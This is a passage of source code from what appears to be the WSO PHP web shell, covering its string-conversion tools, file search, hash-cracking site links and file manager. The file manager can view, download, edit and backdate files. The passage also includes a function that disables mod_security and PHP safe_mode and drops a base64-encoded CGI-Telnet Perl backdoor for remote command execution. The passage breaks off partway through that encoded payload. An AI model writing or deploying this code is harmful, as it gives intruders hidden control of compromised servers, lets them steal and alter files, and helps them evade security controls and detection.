	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'ASCII to HEX' => 'ascii2hex',
		'HEX to ASCII' => 'hex2ascii',
		'HEX to DEC' => 'hexdec',
		'HEX to BIN' => 'hex2bin',
		'DEC to HEX' => 'dechex',
		'DEC to BIN' => 'decbin',
		'BIN to HEX' => 'binhex',
		'BIN to DEC' => 'bindec',
		'String to lower case' => 'strtolower',
		'String to upper case' => 'strtoupper',
		'Htmlspecialchars' => 'htmlspecialchars',
		'String length' => 'strlen',
	);
	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		if(in_array($_POST['p1'], $stringTools))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"

	\'")."';
";
		echo strlen($temp), "
", $temp;
		exit;
	}
	wsoHeader();
	echo '<h1>String conversions</h1><div class=content>';
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"</pre></div><br><h1>Search text in files:</h1><div class=content>
		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
			<tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
			<tr><td></td><td><input type='submit' value='>>'></td></tr>
			</table></form>";

	function wsoRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $item) {
				if(@is_dir($item)){
					if($path!=$item)
						wsoRecursiveGlob($item);
				} else {
					if(@strpos(@file_get_contents($item), @$_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($item)."\", \"view\")'>".htmlspecialchars($item)."</a><br>";
				}
			}
		}
	}
	if(@$_POST['p3'])
		wsoRecursiveGlob($_POST['c']);
	echo "</div><br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name='hf'>
			<input type='text' name='hash' style='width:200px;'><br>
			<input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
			<input type='button' value='milw0rm.com' onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"><br>
			<input type='button' value='hashcracking.info' onclick=\"document.hf.action='https://hashcracking.info/index.php';document.hf.submit()\"><br>
			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
			<input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
		</form></div>";
	wsoFooter();
}

function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: ".$type);
			}
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	wsoHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		wsoFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.wsoPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "
";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	wsoFooter();
}

function actionSafeMode() {
unlink($GLOBALS['cwd'].".htaccess");
unlink($GLOBALS['cwd']."php.ini");
 $fil=fopen($GLOBALS['cwd'].".htaccess","w");
    fwrite($fil,'<IfModule mod_security.c>
Sec------Engine Off
Sec------ScanPOST Off
</IfModule>');
    fclose($fil);
	$fil=fopen($GLOBALS['cwd']."php.ini","w");
      fwrite($fil,'safe_mode=OFF
disable_functions=NONE');
     fclose($fil);
@mkdir('dkcgi',0755);
$file = fopen($dir."dkcgi/.htaccess" ,"w+");
$sa=base64_decode('T3B0aW9ucyBhbGwKRGlyZWN0b3J5SW5kZXggU3V4Lmh0bWwKQWRkVHlwZSB0ZXh0L3BsYWluIC5w
aHAKQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLWNnaSAuc2EKQWRkSGFuZGxlciBzZXJ2ZXIt
cGFyc2VkIC5waHAKQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5zYQpBZGRIYW5kbGVyIGNnaS1zY3Jp
cHQgLnNh');
$write = fwrite ($file ,$sa);

$file = fopen($dir."dkcgi/cgi.pl" ,"w+");
$sa=base64_decode('IyEvdXNyL2Jpbi9wZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIENvcHlyaWdodCBhbmQgTGljZW5jZQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDR0ktVGVsbmV0IFZlcnNpb24gMS4wIGZvciBOVCBhbmQgVW5peCA6IFJ1biBDb21tYW5kcyBvbiB5b3VyIFdlYiBTZXJ2ZXINCiMNCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmENCiMgUGVybWlzc2lvbiBpcyBncmFudGVkIHRvIHVzZSwgZGlzdHJpYnV0ZSBhbmQgbW9kaWZ5IHRoaXMgc2NyaXB0IHNvIGxvbmcNCiMgYXMgdGhpcyBjb3B5cmlnaHQgbm90aWNlIGlzIGxlZnQgaW50YWN0LiBJZiB5b3UgbWFrZSBjaGFuZ2VzIHRvIHRoZSBzY3JpcHQNCiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQ0KIyBpbiB0aGlzIHNjcmlwdCwgeW91IGNhbiBlLW1haWwgbWUuDQojDQojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQ0KIyBBdXRob3IgZS1tYWlsOiByb2hpdGFiQHJvaGl0YWIuY29tDQojIEF1dGhvciBIb21lcGFnZTogaHR0cDovL3d3dy5yb2hpdGFiLmNvbS8NCiMgU2NyaXB0IEhvbWVwYWdlOiBtYWlsdG86VU5JVFhfVEVBTUBIT1RNQUlMLkNPTQ0KIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8NCiMgRGlzY3Vzc2lvbiBGb3J1bTogaHR0cDovL3d3dy5yb2hpdGFiLmNvbS9kaXNjdXNzLw0KIyBNYWlsaW5nIExpc3Q6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vbWxpc3QvDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgSW5zdGFsbGF0aW9uDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRvIGluc3RhbGwgdGhpcyBzY3JpcHQNCiMNCiMgMS4gTW9kaWZ5IHRoZSBmaXJzdCBsaW5lICIjIS91c3IvYmluL3BlcmwiIHRvIHBvaW50IHRvIHRoZSBjb3JyZWN0IHBhdGggb24NCiMgICAgeW91ciBzZXJ2ZXIuIEZvciBtb3N0IHNlcnZlcnMsIHlvdSBtYXkgbm90IG5lZWQgdG8gbW9kaWZ5IHRoaXMuDQojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4NCiMgMy4gSWYgeW91J3JlIHJ1bm5pbmcgdGhlIHNjcmlwdCB1bmRlciBXaW5kb3dzIE5ULCBzZXQgJFdpbk5UID0gMSBpbiB0aGUNCiMgICAgQ29uZmlndXJhdGlvbiBTZWN0aW9uIGJlbG93Lg0KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8NCiMgICAgZXhlY3V0ZSBDR0kgc2NyaXB0cy4gVGhpcyBpcyB1c3VhbGx5IGNnaS1iaW4uIE1ha2Ugc3VyZSB0aGF0IHlvdSB1cGxvYWQNCiMgICAgdGhlIHNjcmlwdCBpbiBBU0NJSSBtb2RlLg0KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4NCiMgNi4gT3BlbiB0aGUgc2NyaXB0IGluIHlvdXIgd2ViIGJyb3dzZXIuIElmIHlvdSB1cGxvYWRlZCB0aGUgc2NyaXB0IGluDQojICAgIGNnaS1iaW4sIHRoaXMgc2hvdWxkIGJlIGh0dHA6Ly93d3cueW91cnNlcnZlci5jb20vY2dpLWJpbi9jZ2l0ZWxuZXQucGwNCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdlIG9ubHkgJFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcg0KIyB2YWx1ZXMgc2hvdWxkIHdvcmsgZmluZSBmb3IgbW9zdCBzeXN0ZW1zLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFBhc3N3b3JkID0gImRrIjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KCQkJCSMgdG8gbG9naW4uDQoNCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UNCgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENtZFNlcCA9ICImIjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQNCgkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuDQoJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQ0KCQkJCSMgYnJvd3NlciBhcyBzb29uIGFzIGl0IGlzIG91dHB1dCwgb3RoZXJ3aXNlDQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlDQoJCQkJIyBwaW5nLCBzbyB0aGF0IHlvdSBjYW4gc2VlIHRoZSBvdXRwdXQgYXMgaXQNCgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KDQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoNCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0KCXsNCgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQoJfQ0KCWVsc2lmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIlBPU1QiKQ0KCXsNCgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOw0KCQlyZWFkKFNURElOLCAkaW4sICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KCX0NCg0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcNCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsNCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87DQoJCSRpbnsnZid9ID0gJDE7DQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsNCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOw0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBQYWdlIEhlYWRlcg0KIyBBcmd1bWVudCAxOiBGb3JtIGl0ZW0gbmFtZSB0byB3aGljaCBmb2N1cyBzaG91bGQgYmUgc2V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlSGVhZGVyDQp7DQoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8dGl0bGU+VW5pdC1YIFRlYW08L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzAwMDAwMCIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPg0KPHRyPg0KPHRkIGJnY29sb3I9IiNDMkJGQTUiIGJvcmRlcmNvbG9yPSIjMDAwMDgwIiBhbGlnbj0iY2VudGVyIj4NCjxiPjxmb250IGNvbG9yPSIjMDAwMDgwIiBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0KPHRkIGJnY29sb3I9IiMwMDAwODAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiIGNvbG9yPSIjMDA5OTAwIj48Yj5DR0ktVGVsbmV0IFVuaXQteCBUZWFtIENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYmdjb2xvcj0iI0MyQkZBNSI+PGZvbnQgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+RG93bmxvYWQgRmlsZTwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8DQo8YSBocmVmPSJVTklUWF9URUFNQEhPVE1BSUwuQ09NIj5IZWxwPC9hPg0KPC9mb250PjwvdGQ+D